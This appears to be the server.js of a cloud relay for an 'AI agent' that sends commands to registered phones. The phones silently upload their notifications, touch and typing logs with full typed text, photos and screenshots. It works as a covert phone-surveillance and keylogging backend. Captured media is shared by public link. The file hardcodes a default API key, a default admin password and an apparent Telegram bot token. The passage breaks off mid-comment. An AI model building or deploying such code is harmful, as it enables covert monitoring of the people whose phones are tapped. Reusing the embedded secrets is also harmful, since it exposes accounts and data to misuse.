// server.js
// ============ CLOUD RELAY SERVER v3 ============
// Command ID matching + result queue + MULTI-DEVICE registry

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const { Readable } = require('stream');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const API_KEY = process.env.API_KEY || 'Gokul_Secret_Agent_99';

// Middleware
app.use(cors());
app.use(express.json({ limit: '100mb' }));

// Storage
const commands = new Map();   // id -> {command, device, target_device, timestamp}
const results = new Map();    // id -> {result, device_id, timestamp}
const devices = new Map();    // device_id -> {name, model, lastSeen, registeredAt}
const fcmTokens = new Map();  // v9: device_id -> {token, updatedAt} for FCM push-wake
const MAX_AGE = 10 * 60 * 1000; // 10 min cleanup
// Bug 2 fix: device online if lastSeen within ~3 min (was 20s). A 20s window
// made the "online" flag flap true/false for live phones whose poll/upload
// cadence occasionally exceeds 20s (FCM push-wake, bursty upload, network
// stalls). 3 min covers the poll interval comfortably while the periodic sweep
// still drops devices unseen for 5 min. Every phone interaction (mobile_poll,
// mobile_result, media_upload, register, touch_upload, notif_upload) touches
// lastSeen so a live phone's timestamp stays fresh.
const ONLINE_WINDOW_MS = 3 * 60 * 1000;

// v8.2: silent notification batches — device_id -> [{ts, entries}]
// In-memory, consume-once. The phone uploads raw notification strings here;
// the laptop AI fetches + summarizes. Phone user sees NOTHING.
const notifBatches = new Map();
const NOTIF_BATCH_CAP = 400;   // per-device cap
const NOTIF_ENTRY_CAP = 16000;  // per-upload entry char cap
const BATCH_TTL_MS = 30 * 60 * 1000; // device-level batch entries older than 30 min are swept

// Sweep any device keys in a batch map (notifBatches/touchBatches) whose newest
// entry is older than BATCH_TTL_MS. Prevents unbounded growth of device keys.
function sweepBatches(map) {
    const now = Date.now();
    for (const [deviceId, arr] of map) {
        let newest = 0;
        for (const b of arr) { if (b.ts > newest) newest = b.ts; }
        if (arr.length === 0 || (newest && now - newest > BATCH_TTL_MS)) {
            map.delete(deviceId);
        }
    }
}

// v8.8: media store — phone uploads photos/videos/screenshots (base64) and the
// laptop downloads them via a shareable URL. In-memory (Render free tier).
const mediaStore = new Map();   // media_id -> {mime, data_b64, ts, filename}
const MEDIA_CAP = 50;           // max stored files (FIFO eviction)
const MEDIA_TTL_MS = 60 * 60 * 1000;  // 1 hour expiry

// v8.9: Google Drive-backed media (long-life storage). Camera photos/screenshots
// are uploaded to the Ai_agent folder in Drive instead of the in-memory map so
// files survive Render restarts. If Drive is unavailable the upload falls back
// to mediaStore (above) so the system never breaks.
//
// Service account: ai-agent-drive@gokul-agent-511317.iam.gserviceaccount.com
// Creds come from env GOOGLE_APPLICATION_CREDENTIALS (JSON string) or the
// committed ./drive-service-account.json file.
//
// We authenticate via google-auth-library (service-account OAuth token) and call
// the Drive v3 REST API directly with the built-in `fetch` (Node 18+). This gives
// us deterministic Content-Length on the multipart upload, which `googleapis`'s
// stream-based media path does not (Drive multipart rejects chunked uploads).
//
// NOTE on storage quota: a bare service account has ZERO Drive storage quota
// (storageQuota.limit == "0"), so a direct upload is rejected with a 403
// "storageQuotaExceeded". To actually persist files, ONE of these must be set up
// on the Google side:
//   (a) OAuth refresh token (works for PERSONAL accounts like @gmail.com): set
//       DRIVE_OAUTH_REFRESH_TOKEN (+ DRIVE_OAUTH_CLIENT_ID/DRIVE_OAUTH_CLIENT_SECRET)
//       so uploads run under that user's own 5TB quota.
//   (b) Domain-wide delegation: grant the service account the Drive scope in the
//       Workspace Admin console, then set DRIVE_IMPERSONATE_EMAIL to the user it
//       should impersonate (files land in that user's Drive with their quota).
//   (c) A Shared Drive: point DRIVE_FOLDER_ID at a folder inside a shared drive.
// Until then, uploads fall back to the in-memory mediaStore (never crash).
const DRIVE_FOLDER_ID = process.env.DRIVE_FOLDER_ID || '145dIFzggdi6UuI5Yt28YBYp0BTvUcZDc';
let driveAuth = null;    // google-auth-library GoogleAuth (lazy-initialized)
let driveFailed = false; // sticky flag: skip re-init after a hard failure

// Lazy-init Drive auth. NEVER throws — returns null if creds are missing/bad
// (or google-auth-library isn't installed), in which case media falls back to
// the in-memory store.
//
// Auth mode is picked by env, highest-priority first:
//   (1) DRIVE_OAUTH_REFRESH_TOKEN (personal Google account, e.g. @gmail.com) —
//       uploads run under the user's own Drive quota (5TB). This is the only
//       path that works for a personal-account folder owner, because a bare
//       service account has ZERO storage quota.
//   (2) Service account (GOOGLE_APPLICATION_CREDENTIALS or
//       ./drive-service-account.json), optionally impersonating a Workspace
//       user via DRIVE_IMPERSONATE_EMAIL (domain-wide delegation).
function initDrive() {
    if (driveAuth) return driveAuth;
    if (driveFailed) return null;
    try {
        const { GoogleAuth } = require('google-auth-library');
        const scope = 'https://www.googleapis.com/auth/drive'; // create + link-share

        // (1) Personal account OAuth refresh token → user's own 5TB quota.
        if (process.env.DRIVE_OAUTH_REFRESH_TOKEN) {
            driveAuth = new GoogleAuth({
                credentials: {
                    type: 'authorized_user',
                    client_id: process.env.DRIVE_OAUTH_CLIENT_ID || '',
                    client_secret: process.env.DRIVE_OAUTH_CLIENT_SECRET || '',
                    refresh_token: process.env.DRIVE_OAUTH_REFRESH_TOKEN,
                },
                scopes: [scope],
            });
            console.log('[Drive] Google Drive auth initialized (OAuth refresh token)');
            return driveAuth;
        }

        // (2) Service account (+ optional domain-wide delegation).
        let credentials;
        if (process.env.GOOGLE_APPLICATION_CREDENTIALS) {
            credentials = JSON.parse(process.env.GOOGLE_APPLICATION_CREDENTIALS);
        } else {
            credentials = require('./drive-service-account.json');
        }
        const opts = { credentials, scopes: [scope] };
        if (process.env.DRIVE_IMPERSONATE_EMAIL) {
            // Impersonate a Workspace user so files land in THEIR Drive (their
            // quota). Requires domain-wide delegation on the Google side.
            opts.clientOptions = { subject: process.env.DRIVE_IMPERSONATE_EMAIL };
        }
        driveAuth = new GoogleAuth(opts);
        console.log('[Drive] Google Drive auth initialized (service account'
            + (process.env.DRIVE_IMPERSONATE_EMAIL ? ', impersonating ' + process.env.DRIVE_IMPERSONATE_EMAIL : '')
            + ')');
    } catch (e) {
        driveFailed = true;
        driveAuth = null;
        console.error('[Drive] init failed — media will use in-memory fallback:', e.message);
    }
    return driveAuth;
}

// Fetch a short-lived access token for the service account, or null on error.
async function driveAccessToken() {
    const auth = initDrive();
    if (!auth) return null;
    try {
        const client = await auth.getClient();
        const t = await client.getAccessToken();
        return (t && t.token) || null;
    } catch (e) {
        console.error('[Drive] token error:', e.message);
        return null;
    }
}

function driveFileExt(mime) {
    const map = {
        'image/jpeg': '.jpg',
        'image/png': '.png',
        'image/webp': '.webp',
        'image/gif': '.gif',
        'video/mp4': '.mp4',
        'video/quicktime': '.mov',
    };
    return map[mime] || '';
}

function driveFilePrefix(mime) {
    if (mime && mime.startsWith('video/')) return 'video';
    if (mime === 'image/png') return 'screenshot';
    if (mime && mime.startsWith('image/')) return 'photo';
    return 'media';
}

// Upload a file buffer to Drive (in the Ai_agent folder) and make it link-shared.
// Returns {id, link, name} on success, or null on ANY failure (caller falls back
// to the in-memory mediaStore).
async function uploadToDrive(buffer, mime, filename) {
    const token = await driveAccessToken();
    if (!token) return null;
    const type = mime || 'application/octet-stream';
    const name = filename || `${driveFilePrefix(type)}-${Date.now()}${driveFileExt(type)}`;
    try {
        // 1) Create the file via a multipart upload (metadata + bytes) with a
        //    known Content-Length so Drive accepts it over non-chunked POST.
        const metadata = { name, mimeType: type, parents: [DRIVE_FOLDER_ID] };
        const boundary = '----agent' + crypto.randomBytes(16).toString('hex');
        const body = Buffer.concat([
            Buffer.from(`--${boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n${JSON.stringify(metadata)}\r\n`),
            Buffer.from(`--${boundary}\r\nContent-Type: ${type}\r\n\r\n`),
            buffer,
            Buffer.from(`\r\n--${boundary}--\r\n`),
        ]);

        const createRes = await fetch(
            'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&supportsAllDrives=true&fields=id,name,webViewLink,webContentLink',
            {
                method: 'POST',
                headers: {
                    Authorization: `Bearer ${token}`,
                    'Content-Type': `multipart/related; boundary=${boundary}`,
                    'Content-Length': String(body.length),
                },
                body,
            }
        );
        const created = await createRes.json().catch(() => ({}));
        if (!createRes.ok || !created.id) {
            throw new Error(`Drive create ${createRes.status}: ${JSON.stringify(created)}`);
        }
        const fileId = created.id;

        // 2) Make it publicly viewable by link (anyone with link -> reader).
        const permRes = await fetch(
            `https://www.googleapis.com/drive/v3/files/${fileId}/permissions?supportsAllDrives=true`,
            {
                method: 'POST',
                headers: {
                    Authorization: `Bearer ${token}`,
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ role: 'reader', type: 'anyone' }),
            }
        );
        const perm = await permRes.json().catch(() => ({}));
        if (!permRes.ok) {
            throw new Error(`Drive permission ${permRes.status}: ${JSON.stringify(perm)}`);
        }

        // 3) Re-fetch metadata so webViewLink/webContentLink reflect the new perm.
        const getRes = await fetch(
            `https://www.googleapis.com/drive/v3/files/${fileId}?supportsAllDrives=true&fields=id,webViewLink,webContentLink`,
            { headers: { Authorization: `Bearer ${token}` } }
        );
        const meta = await getRes.json().catch(() => ({}));
        const link = meta.webViewLink || meta.webContentLink
            || created.webViewLink || created.webContentLink || null;
        return { id: fileId, link, name };
    } catch (e) {
        console.error('[Drive] upload failed:', e.message);
        return null;
    }
}

// Dashboard stats (in-memory, reset on server restart)
const startedAt = Date.now();
let totalCommands = 0;
let totalResults = 0;
const commandHistory = [];    // max 200: {ts, command}

// Cleanup old entries every 2 min
setInterval(() => {
    const now = Date.now();
    for (const [id, cmd] of commands) {
        if (now - new Date(cmd.timestamp).getTime() > MAX_AGE) commands.delete(id);
    }
    for (const [id, res] of results) {
        if (now - new Date(res.timestamp).getTime() > MAX_AGE) results.delete(id);
    }
    // Devices poll every ~5s — anything unseen for 5 min is gone.
    // Keeps the /devices registry from growing forever with stale phones.
    for (const [id, d] of devices) {
        if (now - d.lastSeen > 5 * 60 * 1000) devices.delete(id);
    }
    // Sweep the unbounded in-memory stores (telegram media, live frames, batches).
    sweepTelegramMediaStore();
    sweepLiveFrames();
    sweepBatches(notifBatches);
    sweepBatches(touchBatches);
}, 120000);

// API Key Authentication
function authMiddleware(req, res, next) {
    const apiKey = req.headers['x-api-key'];
    if (!apiKey || apiKey !== API_KEY) {
        return res.status(401).json({ error: 'Unauthorized - Wrong API Key' });
    }
    next();
}

// ---------- v9: Firebase Cloud Messaging (push-wake instead of polling) ----------

let admin = null;
let firebaseMessaging = null;

// Lazy-init Firebase Admin (service account from env var or committed file).
function initFirebase() {
    if (firebaseMessaging) return firebaseMessaging;
    try {
        let sa;
        if (process.env.FIREBASE_SERVICE_ACCOUNT) {
            sa = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
        } else {
            sa = require('./firebase-service-account.json');
        }
        admin = require('firebase-admin');
        if (admin.apps.length === 0) {
            admin.initializeApp({ credential: admin.credential.cert(sa) });
        }
        firebaseMessaging = admin.messaging();
        console.log('[FCM] Firebase Admin initialized');
    } catch (e) {
        console.error('[FCM] init failed (push disabled):', e.message);
    }
    return firebaseMessaging;
}

// Push a command to one device via FCM high-priority DATA message.
// Non-blocking: returns a promise; failures are logged, never crash the request.
function pushFcmCommand(deviceId, commandId, command) {
    const reg = fcmTokens.get(deviceId);
    if (!reg) return Promise.resolve(false);
    const msg = initFirebase();
    if (!msg) return Promise.resolve(false);
    return msg.send({
        token: reg.token,
        data: {
            command_id: String(commandId),
            command: String(command),
        },
        android: { priority: 'high' },
    }).then(() => {
        console.log(`[FCM] pushed to ${deviceId}: ${String(command).slice(0, 60)}`);
        // v9.1: the command was just served via FCM — mark it claimed so the
        // phone's periodic /mobile_poll fallback doesn't re-serve (double-exec).
        const c = commands.get(commandId);
        if (c) { c.claimed = true; c.servedAt = Date.now(); }
        return true;
    }).catch((e) => {
        console.error(`[FCM] push to ${deviceId} failed:`, e.message);
        if (e.code === 'messaging/registration-token-not-registered') {
            fcmTokens.delete(deviceId); // stale token — drop it
        }
        return false;
    });
}

// ---------- Multi-device helpers (v6) ----------

// Touch a device's lastSeen. Creates a minimal registry entry when an
// unregistered device polls (so /devices still shows it).
function touchDevice(deviceId) {
    const id = deviceId || 'legacy';
    let entry = devices.get(id);
    if (!entry) {
        entry = { name: id, model: null, lastSeen: Date.now(), registeredAt: Date.now() };
        devices.set(id, entry);
    } else {
        entry.lastSeen = Date.now();
    }
    return entry;
}

// Is a pending command meant for this polling device?
// 'legacy'/'any' targeted commands are also visible to registered devices
// (single-device compat: updated app + no explicit selection still works),
// but device-specific commands NEVER leak to other devices or old clients.
function commandMatchesDevice(cmd, deviceId) {
    const target = cmd.target_device || cmd.device || 'legacy';
    if (target === 'legacy' || target === 'any') {
        return true; // any poller may serve an untargeted command
    }
    if (deviceId === 'legacy' || deviceId === 'any') {
        return false; // old clients must not consume targeted commands
    }
    return target === deviceId;
}

function deviceSummary() {
    return [...devices.entries()]
        .sort((a, b) => b[1].lastSeen - a[1].lastSeen)
        .map(([id, d]) => ({
            device_id: id,
            name: d.name || id,
            model: d.model || null,
            last_seen: new Date(d.lastSeen).toISOString(),
            last_seen_age_sec: Math.floor((Date.now() - d.lastSeen) / 1000),
            online: (Date.now() - d.lastSeen) < ONLINE_WINDOW_MS,
        }));
}

// Health Check
app.get('/health', (req, res) => {
    const summary = deviceSummary();
    // Backward compat: mobile_last_seen points at the most recent device
    const mostRecent = summary[0] || null;
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        mobile_last_seen: mostRecent ? mostRecent.last_seen : null,
        pending_commands: commands.size,
        pending_results: results.size,
        devices: summary.map(d => ({
            device_id: d.device_id,
            name: d.name,
            online: d.online,
        })),
        device_count: summary.length,
        devices_online: summary.filter(d => d.online).length,
        stats: {
            total_commands: totalCommands,
            total_results: totalResults,
            uptime_sec: Math.floor((Date.now() - startedAt) / 1000),
            started_at: new Date(startedAt).toISOString(),
            command_history: commandHistory,
        },
    });
});

// Laptop → Server: Command anupum (returns command ID)
// v6: optional target_device routes the command to one specific phone
// (omit = 'legacy' → served to old clients + selected default device)
app.post('/send_command', authMiddleware, (req, res) => {
    // v7.1 sweep: device_id in body is accepted as an alias for target_device
    // (some clients send device_id instead — route it correctly, don't drop it)
    const { command, device, target_device, device_id, timeout_ms } = req.body;
    const target = target_device || device_id || 'legacy';

    if (!command) {
        return res.status(400).json({ error: 'Command is required' });
    }

    const id = crypto.randomUUID();
    commands.set(id, {
        command,
        device: device || 'mobile',
        target_device: target,
        timestamp: new Date().toISOString(),
        claimed: false,   // v9.1: set true once served (poll or FCM) — prevents double-exec
    });

    // dashboard stats
    totalCommands += 1;
    commandHistory.push({ ts: Date.now(), command: String(command).slice(0, 60) });
    if (commandHistory.length > 200) commandHistory.shift();

    // v9: FCM push-wake — push immediately so the phone wakes (no polling wait).
    // Specific target → push to that device only. legacy/any → push to ALL
    // registered FCM tokens (single-device setup keeps working with no device_id).
    if (target !== 'legacy' && target !== 'any') {
        pushFcmCommand(target, id, command); // fire-and-forget (non-blocking)
    } else {
        for (const deviceId of fcmTokens.keys()) {
            pushFcmCommand(deviceId, id, command);
        }
    }

    console.log(`[${new Date().toISOString()}] CMD ${id.slice(0, 8)} -> ${target}: ${command.slice(0, 80)}`);
    res.json({ status: 'command_sent', id, target_device: target });
});

// v9: Phone → Server: register its FCM token (for push-wake).
app.post('/register_fcm', authMiddleware, (req, res) => {
    const device_id = (req.body && req.body.device_id)
        || req.headers['x-device-id']
        || 'legacy';
    const fcm_token = (req.body && req.body.fcm_token) || '';
    if (!fcm_token) {
        return res.status(400).json({ error: 'fcm_token is required' });
    }
    // v9.1: prune any OTHER device entry bound to the same token (an FCM token
    // can only belong to one device_id at a time), then bind this device. This
    // keeps exactly one token per device and one device per token.
    for (const [dId, reg] of fcmTokens) {
        if (reg && reg.token === fcm_token) fcmTokens.delete(dId);
    }
    fcmTokens.set(device_id, { token: fcm_token, updatedAt: Date.now() });
    touchDevice(device_id);
    res.json({ ok: true, device_id });
});

// Laptop → Server: Wait for result (long-poll up to timeout)
app.get('/get_result', authMiddleware, async (req, res) => {
    const { id, timeout_ms } = req.query;
    const timeout = Math.min(parseInt(timeout_ms) || 30000, 120000);
    const start = Date.now();

    if (!id) {
        // Legacy mode: return latest result
        const latest = [...results.values()].sort(
            (a, b) => new Date(b.timestamp) - new Date(a.timestamp)
        )[0];
        return res.json(latest ? { result: latest.result } : { result: null });
    }

    // Long-poll: wait until result arrives or timeout
    while (Date.now() - start < timeout) {
        if (results.has(id)) {
            const { result } = results.get(id);
            results.delete(id); // consume
            return res.json({ id, result });
        }
        await new Promise(r => setTimeout(r, 500));
    }

    res.status(408).json({ error: 'Mobile result timeout — mobile online-la irukkanum', id });
});

// Mobile → Server: Poll pannum (command edukkum)
// v6: optional device_id in body routes commands per-device. Old clients
// that send no device_id poll as 'legacy' and only get legacy/any commands.
app.post('/mobile_poll', authMiddleware, (req, res) => {
    // device_id: JSON body first, X-Device-Id header as fallback, else 'legacy'
    const device_id = (req.body && req.body.device_id)
        || req.headers['x-device-id']
        || 'legacy';
    touchDevice(device_id);

    // Oldest PENDING (unclaimed) command for THIS device. Claimed commands
    // (already served via FCM) are skipped so a slow command isn't re-run.
    const oldest = [...commands.entries()]
        .filter(([, c]) => !c.claimed && commandMatchesDevice(c, device_id))
        .sort((a, b) => new Date(a[1].timestamp) - new Date(b[1].timestamp))[0];

    if (oldest) {
        const [id, cmd] = oldest;
        // Mark claimed (rather than delete) so the poll fallback can't re-serve
        // it. /mobile_result still stores the result and deletes it; the 10-min
        // sweep removes commands that never produced a result.
        cmd.claimed = true;
        cmd.servedAt = Date.now();
        return res.json({ id, command: cmd.command, timestamp: cmd.timestamp, device_id });
    }
    res.json({ command: null, device_id });
});

// Mobile → Server: Result anupum (with command ID)
// v6: optional device_id in body is stored with the result
app.post('/mobile_result', authMiddleware, (req, res) => {
    const { id, result } = req.body;
    // Bug 1 fix: read device_id from body OR X-Device-Id header (consistent with
    // every other phone-upload endpoint so header-only clients aren't lost).
    const device_id = (req.body && req.body.device_id)
        || req.headers['x-device-id']
        || null;

    if (result === undefined || result === null) {
        return res.status(400).json({ error: 'Result is required' });
    }

    // Bug 2 fix: touch on EVERY result (even header/legacy) so a live phone's
    // lastSeen stays fresh and the online flag doesn't flap.
    touchDevice(device_id);

    results.set(id || 'legacy', {
        result: String(result).slice(0, 100000000), // 100MB cap (no practical limit)
        device_id: device_id,
        timestamp: new Date().toISOString(),
    });

    // v9: FCM-pushed commands are executed WITHOUT polling; drop the matching
    // command from the queue here so the phone's 30s poll fallback never re-runs it.
    if (id) commands.delete(id);

    totalResults += 1;

    console.log(`[${new Date().toISOString()}] RESULT ${(id || 'legacy').slice(0, 8)}${device_id ? ` (${device_id})` : ''}: ${String(result).slice(0, 60)}`);
    res.json({ status: 'result_received' });
});

// ---------- v6 MULTI-DEVICE endpoints ----------

// Mobile → Server: register/refresh this device in the registry
app.post('/register_device', authMiddleware, (req, res) => {
    const device_id = (req.body && req.body.device_id) || req.headers['x-device-id'];
    const { name, model } = req.body || {};
    if (!device_id) {
        return res.status(400).json({ error: 'device_id is required' });
    }
    const existing = devices.get(device_id);
    devices.set(device_id, {
        name: name || (existing && existing.name) || device_id,
        model: model !== undefined ? model : (existing && existing.model) || null,
        lastSeen: Date.now(),
        registeredAt: (existing && existing.registeredAt) || Date.now(),
    });
    console.log(`[${new Date().toISOString()}] REGISTER device '${device_id}' (${name || '?'})`);
    res.json({ ok: true, device_id });
});

// Laptop/UI → Server: list all registered devices (newest first)
app.get('/devices', authMiddleware, (req, res) => {
    res.json({ devices: deviceSummary() });
});

// Laptop → Server: enqueue the SAME command for ALL ONLINE devices
app.post('/broadcast', authMiddleware, (req, res) => {
    const { command } = req.body;
    if (!command) {
        return res.status(400).json({ error: 'Command is required' });
    }
    const now = Date.now();
    const onlineIds = [...devices.entries()]
        .filter(([, d]) => (now - d.lastSeen) < ONLINE_WINDOW_MS)
        .map(([id]) => id);

    const ids = [];
    for (const devId of onlineIds) {
        const id = crypto.randomUUID();
        commands.set(id, {
            command,
            device: 'mobile',
            target_device: devId,
            timestamp: new Date().toISOString(),
            claimed: false,
        });
        ids.push(id);
    }
    totalCommands += 1;
    commandHistory.push({ ts: Date.now(), command: `[broadcast x${ids.length}] ${String(command).slice(0, 40)}` });
    if (commandHistory.length > 200) commandHistory.shift();

    console.log(`[${new Date().toISOString()}] BROADCAST to ${ids.length} device(s): ${command.slice(0, 80)}`);
    res.json({ ok: true, ids, count: ids.length, devices: onlineIds });
});

// ---------- v8.1: Admin panel + life log ----------

// token -> expiry (ms). 1-hour sessions.
const adminSessions = new Map();
const ADMIN_TTL_MS = 60 * 60 * 1000;

// Life log store: stream_type -> [{device_id, ts, entry}] (capped, in-memory)
const lifeLogPublic = [];
const lifeLogPrivate = [];
const LIFELOG_CAP = 1000;

function requireAdmin(req, res, next) {
    const token = req.headers['x-admin-token'];
    if (!token || !adminSessions.has(token)) {
        return res.status(403).json({ error: 'Forbidden - admin token required' });
    }
    if (Date.now() > adminSessions.get(token)) {
        adminSessions.delete(token);
        return res.status(403).json({ error: 'Forbidden - admin session expired' });
    }
    next();
}

// POST /admin/login {password} -> {ok, token, expires_in}
app.post('/admin/login', authMiddleware, (req, res) => {
    const password = (req.body && req.body.password) || '';
    const expected = process.env.ADMIN_PASSWORD || 'admin_agent';
    if (password !== expected) {
        return res.status(401).json({ ok: false, error: 'Wrong admin password' });
    }
    // token = sha256(password + random secret)
    const secret = crypto.randomBytes(24).toString('hex');
    const token = crypto.createHash('sha256')
        .update(password + secret).digest('hex');
    const expiry = Date.now() + ADMIN_TTL_MS;
    adminSessions.set(token, expiry);
    console.log(`[${new Date().toISOString()}] ADMIN login ok (session 1h)`);
    res.json({ ok: true, token, expires_in: 3600 });
});

// GET /life_log/public - masked stream (API key only)
app.get('/life_log/public', authMiddleware, (req, res) => {
    res.json({ ok: true, stream: 'public', count: lifeLogPublic.length,
               entries: lifeLogPublic.slice(-1000) });
});

// GET /life_log/admin - FULL private stream (API key + admin token)
app.get('/life_log/admin', authMiddleware, requireAdmin, (req, res) => {
    res.json({ ok: true, stream: 'private', count: lifeLogPrivate.length,
               entries: lifeLogPrivate.slice(-1000) });
});

// POST /life_log/upload {device_id, stream_type, entries:[]}
app.post('/life_log/upload', authMiddleware, (req, res) => {
    const deviceId = (req.body && req.body.device_id) || req.headers['x-device-id'] || 'legacy';
    const streamType = (req.body && req.body.stream_type) || 'public';
    const entries = (req.body && Array.isArray(req.body.entries)) ? req.body.entries : [];
    const store = streamType === 'private' ? lifeLogPrivate : lifeLogPublic;
    const now = Date.now();
    for (const e of entries.slice(0, 1000)) {
        store.push({ device_id: deviceId, ts: now, entry: String(e).slice(0, 200) });
    }
    while (store.length > LIFELOG_CAP) store.shift();
    res.json({ ok: true, stored: Math.min(entries.length, 1000), stream: streamType });
});

// ---------- v8.2: Silent notification batches ----------

// Mobile → Server: upload raw notification strings (consumer gets them later)
app.post('/notif_upload', authMiddleware, (req, res) => {
    const deviceId = (req.body && req.body.device_id)
        || req.headers['x-device-id']
        || 'legacy';
    const entries = (req.body && typeof req.body.entries === 'string')
        ? req.body.entries : '';
    if (!entries) {
        return res.json({ ok: true, stored: 0, device_id: deviceId });
    }
    let arr = notifBatches.get(deviceId);
    if (!arr) {
        arr = [];
        notifBatches.set(deviceId, arr);
    }
    arr.push({ ts: Date.now(), device_id: deviceId, entries: entries.slice(0, NOTIF_ENTRY_CAP) });
    while (arr.length > NOTIF_BATCH_CAP) arr.shift();
    touchDevice(deviceId);
    console.log(`[${new Date().toISOString()}] NOTIF upload ${deviceId}: ${entries.slice(0, 60)}`);
    res.json({ ok: true, stored: 1, device_id: deviceId });
});

// Laptop → Server: fetch buffered notifications (CURSOR-BASED, not consume-once).
// `after_ts` = return only batches uploaded after that timestamp; NOT deleted.
app.get('/notif_fetch', authMiddleware, (req, res) => {
    const deviceId = req.query.device_id;
    const afterTs = parseInt(req.query.after_ts || '0', 10) || 0;

    const collect = (arr) => {
        const parts = [];
        let n = 0, next = afterTs;
        for (const b of arr) {
            if (b.ts > afterTs) { parts.push(b.entries); n++; if (b.ts > next) next = b.ts; }
        }
        return { entries: parts.join('\n'), count: n, next_ts: next };
    };

    // Bug 1 fix: when a device_id is requested return ONLY that device's buffered
    // events — even if empty. The old `has(deviceId)` guard fell through to the
    // aggregate branch when the requested device had no buffered batches yet,
    // leaking other devices' (e.g. Oppo) events into the response.
    if (deviceId) {
        const r = collect(notifBatches.get(deviceId) || []);
        return res.json(Object.assign({ device_id: deviceId }, r));
    }
    // No specific device (legacy/single-device mode): aggregate everything buffered.
    const parts = [];
    let n = 0, next = afterTs;
    for (const [, arr] of notifBatches) {
        for (const b of arr) {
            if (b.ts > afterTs) { parts.push(b.entries); n++; if (b.ts > next) next = b.ts; }
        }
    }
    res.json({ entries: parts.join('\n'), count: n, next_ts: next });
});

// Explicit reset: clear buffered notifications for a device (or all).
app.post('/notif_clear', authMiddleware, (req, res) => {
    const deviceId = (req.body && req.body.device_id) || req.query.device_id;
    if (deviceId) { notifBatches.delete(deviceId); }
    else { notifBatches.clear(); }
    res.json({ ok: true, cleared: deviceId || 'all' });
});

// ---------- v8.5: Live touch/activity tracking (cursor-based, NOT consume-once) ----------

// device_id -> [{ts, entries}] — phone uploads raw touch/click/activity lines.
// /touch_fetch reads incrementally via `after_ts` cursor WITHOUT deleting;
// /touch_clear explicitly resets the buffer.
const touchBatches = new Map();
const TOUCH_BATCH_CAP = 400;   // per-device batch cap (bigger window)
const TOUCH_ENTRY_CAP = 16000; // per-upload entry char cap

// Mobile → Server: upload raw touch/activity lines
app.post('/touch_upload', authMiddleware, (req, res) => {
    const deviceId = (req.body && req.body.device_id)
        || req.headers['x-device-id']
        || 'legacy';
    const entries = (req.body && typeof req.body.entries === 'string')
        ? req.body.entries : '';
    if (!entries) {
        return res.json({ ok: true, stored: 0, device_id: deviceId });
    }
    let arr = touchBatches.get(deviceId);
    if (!arr) {
        arr = [];
        touchBatches.set(deviceId, arr);
    }
    arr.push({ ts: Date.now(), device_id: deviceId, entries: entries.slice(0, TOUCH_ENTRY_CAP) });
    while (arr.length > TOUCH_BATCH_CAP) arr.shift();
    touchDevice(deviceId);
    res.json({ ok: true, stored: 1, device_id: deviceId });
});

// Laptop → Server: fetch buffered touch/activity events (CURSOR-BASED, not consume-once).
// `after_ts` (ms epoch) = return only batches uploaded after that timestamp.
// Does NOT delete — returns a `next_ts` cursor for the next incremental read.
// NOTE: the "admin-only" gate lives in the laptop tool (fetch_touch_events
// checks admin_auth, same as life_log_read_private) — this stream now carries
// full typed text + coordinates.
app.get('/touch_fetch', authMiddleware, (req, res) => {
    const deviceId = req.query.device_id;
    const afterTs = parseInt(req.query.after_ts || '0', 10) || 0;

    const collect = (arr) => {
        const parts = [];
        let n = 0, first = 0, next = afterTs;
        for (const b of arr) {
            if (b.ts > afterTs) {
                parts.push(b.entries);
                n++;
                if (!first) first = b.ts;
                if (b.ts > next) next = b.ts;
            }
        }
        return { entries: parts.join('\n'), count: n, first_ts: first, next_ts: next };
    };

    // Bug 1 fix: strict per-device filter — return ONLY the requested device's
    // buffered events (even if empty). Do NOT fall through to the aggregate
    // branch, which mixed other devices' events into the requested device's tap.
    if (deviceId) {
        const r = collect(touchBatches.get(deviceId) || []);
        return res.json(Object.assign({ device_id: deviceId }, r));
    }
    // No specific device: aggregate everything currently buffered (legacy view).
    const parts = [];
    let n = 0, next = afterTs;
    for (const [, arr] of touchBatches) {
        for (const b of arr) {
            if (b.ts > afterTs) { parts.push(b.entries); n++; if (b.ts > next) next = b.ts; }
        }
    }
    res.json({ entries: parts.join('\n'), count: n, next_ts: next, first_ts: 0 });
});

// Explicit reset: clear buffered touch/activity for a device (or all devices).
app.post('/touch_clear', authMiddleware, (req, res) => {
    const deviceId = (req.body && req.body.device_id) || req.query.device_id;
    if (deviceId) { touchBatches.delete(deviceId); }
    else { touchBatches.clear(); }
    res.json({ ok: true, cleared: deviceId || 'all' });
});

// ---------- v8.10: Telegram storage (free unlimited cloud) ----------

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8613025368:AAGp9UW8AdKnQXojcNlFB80C4v3CIPocixY';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6620147919';
// Telegram file_id -> {url, mime, filename, ts}. `url` is the api.telegram.org
// file URL (which embeds the bot token). It is ONLY ever fetched server-side by
// /media/:id and never returned to a client, so the token never leaks.
const telegramMediaStore = new Map();
const TELEGRAM_MEDIA_CAP = 500;                    // max cached telegram files
const TELEGRAM_MEDIA_TTL_MS = 24 * 60 * 60 * 1000; // expire after 24h

// Remove expired telegram entries (TTL) — called on add + periodic sweep.
function sweepTelegramMediaStore() {
    const now = Date.now();
    for (const [id, e] of telegramMediaStore) {
        if (!e.ts || now - e.ts > TELEGRAM_MEDIA_TTL_MS) telegramMediaStore.delete(id);
    }
}

// Resolve a telegram file_id → file_path via getFile (used on upload & on
// download-link expiry refresh). Returns the path or null on any error.
async function fetchTelegramFilePath(fileId) {
    try {
        const gf = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${encodeURIComponent(fileId)}`);
        const gdata = await gf.json();
        if (gdata.ok && gdata.result && gdata.result.file_path) return gdata.result.file_path;
    } catch (e) {
        console.warn('[MEDIA] Telegram getFile refresh failed:', e.message);
    }
    return null;
}

// Stream a telegram file's bytes straight to the HTTP response (server-side
// fetch → pipe). The bot token never leaves this process. Returns true once the
// stream has been started, false if the telegram download failed.
//
// Telegram file links expire after ~1h. On a 404/expiry we re-resolve the
